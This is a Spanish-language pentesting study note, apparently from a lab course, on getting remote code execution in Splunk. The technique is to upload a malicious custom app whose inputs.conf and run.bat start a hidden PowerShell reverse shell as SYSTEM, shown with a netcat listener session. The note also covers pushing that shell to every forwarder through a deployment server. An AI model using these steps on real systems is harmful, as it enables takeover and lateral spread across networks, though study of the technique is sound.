---
tags:
  - Web/Red-Team
  - Splunk
  - Pentesting/Explotacion
Descripción: "Con acceso admin (o a un Splunk Free), el RCE se consigue subiendo una aplicación Splunk custom que ejecuta un script (Python en Linux, PowerShell/Batch en Windows)"
Fecha de actualización: 2026-07-16
Nota previa: "[[00 - Descubrimiento y enumeración de Splunk]]"
Nota siguiente: "[[PRTG Network Monitor]]"
Area: "[[Common Applications.base|Common Applications]]"
---
---

Con acceso admin (o a un [[00 - Descubrimiento y enumeración de Splunk|Splunk Free]]), el RCE se consigue <mark style="background: #FFB86CA6;">subiendo una **aplicación Splunk custom** que ejecuta un script</mark> (Python en Linux, PowerShell/Batch en Windows).

# La app maliciosa

Estructura mínima: `bin/` con el script y `default/inputs.conf` que le dice a Splunk que lo ejecute.

```text
splunk_shell/
├── bin/            → run.ps1 (reverse shell), run.bat (wrapper), rev.py (Linux)
└── default/
    └── inputs.conf
```

El `inputs.conf` activa el script y lo lanza cada 10 s:

```ini
[script://.\bin\run.bat]
disabled = 0
interval = 10
sourcetype = shell
```

El `run.bat` invoca el PowerShell one-liner en oculto:

```text
@ECHO OFF
PowerShell.exe -exec bypass -w hidden -Command "& '%~dpn0.ps1'"
Exit
```

Se empaqueta y se sube por **Settings → Install app from file**:

```shell-session
$ tar -cvzf updater.tar.gz splunk_shell/
$ sudo nc -lnvp 443        # listener; al subir la app se activa sola
...
connect to [10.10.14.15] from 10.129.201.50
PS C:\Windows\system32> whoami
nt authority\system
```

<mark style="background: #FF5582A6;">En Windows suele devolver `NT AUTHORITY\SYSTEM`</mark>; en Linux se usa `rev.py` (Python, siempre presente en Splunk) en vez del `.ps1`.

> [!important]+ Deployment server = compromiso masivo
> Si el Splunk comprometido es un **deployment server**, colocar la app en `$SPLUNK_HOME/etc/deployment-apps` <mark style="background: #8000E1A6;">empuja el reverse shell a **todos** los hosts con Universal Forwarder</mark> instalado. Un solo Splunk se convierte en RCE sobre decenas de máquinas — un pivote brutal en interno. (En entornos Windows, el forwarder no trae Python → usar PowerShell.)

> [!info]+ Herramientas
> [`reverse_shell_splunk`](https://github.com/0xjpuff/reverse_shell_splunk) automatiza la creación de la app. Recordar los vectores por CVE recientes de la [[00 - Descubrimiento y enumeración de Splunk|nota de discovery]] (CVE-2023-46214), aunque el abuso de app custom es el más fiable.

Siguiente herramienta de monitorización: [[PRTG Network Monitor]].
